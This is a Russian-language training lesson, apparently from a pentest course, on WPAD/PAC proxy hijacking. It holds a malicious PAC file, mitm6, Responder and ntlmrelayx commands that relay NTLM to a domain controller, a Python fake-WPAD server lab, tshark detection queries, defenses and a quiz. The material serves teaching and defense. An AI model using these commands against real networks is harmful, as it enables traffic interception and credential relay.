---
id: network-wpad-proxy
title: "WPAD и прокси-атаки: захват трафика через автообнаружение прокси"
category: network
parent: network-dhcp
difficulty: medium
order: 1
tags: [network, wpad, proxy, pac, mitm, dhcp, ipv6]
prerequisites: [network-mitm, network-dhcp]
useful_for:
  - "Пентест внутренних сетей"
  - "Red team / AD-атаки"
  - "Защита корпоративной ЛВС"
estimated_minutes: 35
summary: "WPAD и PAC как вектор MITM: DHCP-опция 252, DNS/LLMNR-перехват, mitm6 и Responder, прозрачные прокси, риски и защита."
---

WPAD (Web Proxy Auto-Discovery) — механизм, придуманный для удобства: браузер сам находит прокси-сервер в сети и получает от него файл конфигурации PAC. Удобство обернулось дырой: и обнаружение, и сам файл PAC по умолчанию не аутентифицируются. Атакующий в сети объявляет себя прокси, отдаёт вредоносный PAC и пропускает через себя **весь HTTP(S)-трафик** жертвы. В связке с `mitm6` это один из надёжных способов перехвата в Windows-сетях.

## Что такое WPAD и PAC

Браузер ищет WPAD-сервер так (в порядке, зависящем от ОС):

1. **DHCP**: запрашивает опцию **252** (WPAD URL) — если сервер её отдал, использует.
2. **DNS**: пытается разрешить имя `wpad.<домен>` или просто `wpad`.
3. **LLMNR/NBT-NS**: если DNS не помог — широковещательный запрос `wpad`.
4. Получив URL, скачивает файл **PAC** (обычно `wpad.dat`) и выполняет в нём JS-функцию `FindProxyForURL(url, host)`.

```javascript
function FindProxyForURL(url, host) {
  if (shExpMatch(host, "*.corp.local")) return "DIRECT";
  return "PROXY 10.0.0.66:8080";   // атакующий видит весь внешний трафик
}
```

Обратите внимание: PAC — это исполняемый JavaScript, и он может направлять трафик куда угодно, включая атакующего.

## Как атакуют WPAD

- **DHCP-опция 252.** Если в сети есть атакующий DHCP-сервер (или spoofing существующего), он отдаёт опцию 252 с URL своего PAC.
- **DNS/LLMNR-перехват.** Отвечаем на запрос `wpad` своим адресом (Responder умеет это), а затем отдаём `wpad.dat` через встроенный HTTP-сервер.
- **IPv6 (mitm6).** Windows предпочитает IPv6; `mitm6` становится DHCPv6-сервером и RA-источником, выдаёт себя за DNS, а затем отвечает на `wpad` — получает авторизацию NTLM и/или прокси-трафик.

## Инструменты

- **mitm6** — IPv6 DHCPv6/RA-спуфинг + WPAD/DNS-ответы.
- **Responder** — режим WPAD (`-w`) с авторизацией через NTLM.
- **ntlmrelayx** — релеинг собранных WPAD-аутентификаций.
- **WPA2 evil twin** — не про WPAD, но та же идея «я твой шлюз».
- **tcpdump/tshark** — анализ DHCP-опций и DNS-запросов.

```bash
# mitm6: стать DHCPv6 и отвечать на wpad
sudo mitm6 -d corp.local
# Responder с WPAD и сбором NTLM через фейковый прокси
sudo responder -I eth0 -wv
# Релеинг полученной WPAD-аутентификации
sudo impacket-ntlmrelayx -6 -wh attacker.corp.local -t ldaps://dc.corp.local --add-computer
```

## Разобранный пример: WPAD через IPv6

1. Включаем `mitm6 -d corp.local` — он рассылает RA и DHCPv6, делая себя DNS для клиентов.
2. Клиент запрашивает `wpad.corp.local`. `mitm6` отвечает своим IPv6-адресом.
3. Клиент идёт к нам по HTTP за `wpad.dat`, а `mitm6` (в связке с Responder) просит **аутентификацию** — и жертва присылает NTLM-хэш.
4. Параллельно можно отдать PAC, направляющий весь HTTP через наш прокси, — и читать/модифицировать трафик.
5. Собранную аутентификацию релеим через `ntlmrelayx` на LDAP(S) контроллера домена, например, для создания компьютерного аккаунта (`--add-computer`) — так делают RBCD-атаки.

## Прозрачные прокси и их риски

Помимо WPAD, в сетях встречаются **прозрачные прокси** (Squid, Zscaler, корпоративные шлюзы), которые перехватывают HTTP(S). Риски:

- **TLS-инспекция** (MITM-прокси с подменным CA) — если корневой CA прокси скомпрометирован, весь «защищённый» трафик читается.
- **Логирование** — прокси видит URL, заголовки, часто cookies.
- **HTTP-аутентификация прокси** — NTLM/Basic через прокси тоже можно релеить.
- **Прокси как точка обхода** — внутренние прокси часто имеют доступ к сегментам, недоступным напрямую.

Проверка в пентесте: узнать, используется ли прокси, через `wpad.dat`, настройки браузера и переменные окружения; протестировать, релеится ли прокси-аутентификация.

## Защита

| Мера | Против чего |
|---|---|
| Отключить автообнаружение прокси (GPO: `DisableWpad`) | WPAD-перехват |
| Не отдавать DHCP-опцию 252 | DHCP-WPAD |
| Отключить IPv6, если не нужен | mitm6 |
| SMB/LDAP signing + EPA | Релеинг |
| Строгий DNS (DNSSEC, DoH) | DNS-перехват |
| Не использовать прозрачные прокси без нужды | TLS-инспекция |
| Защита корневого CA прокси | Подмена сертификатов |

## Частые ошибки и подводные камни

- **Считать WPAD «выключенным по умолчанию».** В Windows он исторически включён («Automatically detect settings»).
- **Игнорировать IPv6.** Отключение IPv4-вектора не помогает, если активен IPv6.
- **Оставлять `-wh` в mitm6 пустым.** Без хостнейма вроде `attacker.corp.local` NTLM-аутентификация не соберётся.
- **Путать PAC и прокси.** PAC — лишь конфигурация; реальный перехват делает прокси, куда PAC указывает.
- **Забывать про SMB signing.** Даже собрав хэш через WPAD, без signing его не зарелеить на SMB.

## Что дальше / решение

WPAD — часть связки «IPv6 + LLMNR/NBT-NS + WPAD», дающей полный перехват в Windows-сети. Изучите `network-netbios-llmnr`, `network-ntlm-relay` и AD-playbook. Для защиты: отключите WPAD и IPv6 (если не используются), включите signing/EPA, поставьте NTLM-ограничения. Для CTF — потренируйтесь писать PAC-файл и поднимать простой прокси на Python/Scapy.

## Справочная таблица

| Опция DHCP | Значение |
|---|---|
| 6 | DNS-серверы |
| 3 | Шлюз |
| 252 | WPAD URL |

| Инструмент | Роль |
|---|---|
| mitm6 | IPv6 DHCPv6/RA + WPAD |
| Responder `-w` | WPAD + сбор NTLM |
| ntlmrelayx | Релеинг |
| wpad.dat | PAC-файл |

## Анализ WPAD-трафика

Чтобы понять, использует ли сеть WPAD, начните с пассивного анализа. В дампе ищите DHCP-опцию 252 и DNS/LLMNR-запросы имени `wpad`:

```bash
# DHCP-запросы с опцией 252 (WPAD)
tshark -r cap.pcap -Y "dhcp.option.dhcp == 1" \
  -T fields -e ip.src -e dhcp.option.wpad_url 2>/dev/null | sort -u
# Запросы имени wpad в LLMNR/NBT-NS/DNS
tshark -r cap.pcap -Y "dns.qry.name contains \"wpad\" || nbns.name contains \"wpad\"" \
  -T fields -e ip.src -e dns.qry.name -e nbns.name | sort -u
# Скачанный PAC
tshark -r cap.pcap -Y "http.request.uri contains \"wpad.dat\"" -T fields -e http.host -e http.request.full_uri
```

Если видите запросы `wpad` без ответа — сеть уязвима к poisoning. Если есть ответ с вашим адресом и последующее скачивание `wpad.dat` — атака уже идёт. Полезно также проверить, как браузеры настроены: в Windows через `netsh winhttp show proxy` и реестр `HKCU\...\Connections`, в Linux — переменные `http_proxy`/`https_proxy`.

## Практическая лаборатория: фейковый WPAD

1. Поднимите простой HTTP-сервер, отдающий `wpad.dat` с вашим прокси:
   ```python
   # wpad_server.py — отдаёт PAC, направляющий весь трафик на 10.0.0.66:8080
   from http.server import BaseHTTPRequestHandler, HTTPServer
   PAC = b"""function FindProxyForURL(url, host){
     return "PROXY 10.0.0.66:8080";
   }"""
   class H(BaseHTTPRequestHandler):
       def do_GET(self):
           self.send_response(200)
           self.send_header("Content-Type", "application/x-ns-proxy-autoconfig")
           self.end_headers(); self.wfile.write(PAC)
   HTTPServer(("0.0.0.0", 80), H).serve_forever()
   ```
2. Отведите клиента на этот сервер через DHCP-опцию 252 (dnsmasq с `dhcp-option=252,"http://10.0.0.66/wpad.dat"`) или через LLMNR/NBT-NS-ответ.
3. Клиент скачает PAC и начнёт ходить через ваш прокси. Проверьте перехват в логах прокси.
4. Включите GPO `DisableWpad` и повторите — браузер перестанет запрашивать WPAD.

Это упражнение демонстрирует весь путь: обнаружение → PAC → перехват → защита.

## Квиз

```quiz
- question: "Какая DHCP-опция отдаёт URL WPAD?"
  options:
    - "3"
    - "6"
    - "252"
    - "43"
  answer: 2
  explanation: "Опция 252 (WPAD) сообщает клиенту URL конфигурации автообнаружения прокси."
- question: "Что такое PAC-файл?"
  options:
    - "Протокол шифрования"
    - "JavaScript-функция FindProxyForURL, задающая прокси"
    - "Тип DHCP-запроса"
    - "Формат сертификата"
  answer: 1
  explanation: "PAC содержит JS-функцию FindProxyForURL, определяющую, какой прокси использовать."
- question: "Почему mitm6 эффективен против Windows-хостов?"
  options:
    - "Он ломает пароли"
    - "Windows предпочитает IPv6 и по умолчанию доверяет DHCPv6/RA"
    - "Он отключает фаервол"
    - "Он перехватывает Wi-Fi"
  answer: 1
  explanation: "Windows по умолчанию предпочитает IPv6 и доверяет анонсам DHCPv6/RA, что позволяет стать DNS/WPAD."
- question: "Какая мера отключает сам вектор WPAD?"
  options:
    - "Смена пароля"
    - "GPO DisableWpad / отключение автообнаружения прокси"
    - "Установка антивируса"
    - "Включение NTLMv1"
  answer: 1
  explanation: "Отключение автообнаружения прокси (DisableWpad) убирает возможность WPAD-перехвата."
- question: "Почему прозрачный прокси с TLS-инспекцией опасен?"
  options:
    - "Он замедляет сеть"
    - "Он терминирует TLS своим CA и видит содержимое трафика"
    - "Он блокирует DNS"
    - "Он требует IPv6"
  answer: 1
  explanation: "Прозрачный прокси с подменным CA расшифровывает TLS, получая доступ к содержимому."
```

## Где пригодится

- **Пентест/red team:** получение NTLM-аутентификации и перехват трафика в ЛВС.
- **Работа/SOC:** проверка конфигурации WPAD и прозрачных прокси.
- **CTF:** задачи на разбор PAC и DHCP-опций.
- **Сертификации:** OSCP/CRTP — внутренние сетевые атаки.
